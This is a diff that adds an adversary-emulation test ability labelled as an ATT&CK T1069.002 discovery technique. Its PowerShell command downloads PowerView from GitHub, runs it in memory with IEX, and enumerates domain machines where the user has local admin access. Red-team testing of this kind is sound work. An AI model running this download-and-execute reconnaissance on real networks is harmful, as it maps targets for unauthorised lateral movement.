@@ -1,0 +1,13 @@
+- id: a11f3493-c0b0-5c3b-949d-c9b6f038f590
+  name: Soumaia ART Tests - Find machines where user has local admin access (PowerView)
+  description: Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.
+  tactic: discovery
+  technique:
+    attack_id: T1069.002
+    name: 'Permission Groups Discovery: Domain Groups'
+  platforms:
+    windows:
+      psh:
+        command: |-
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
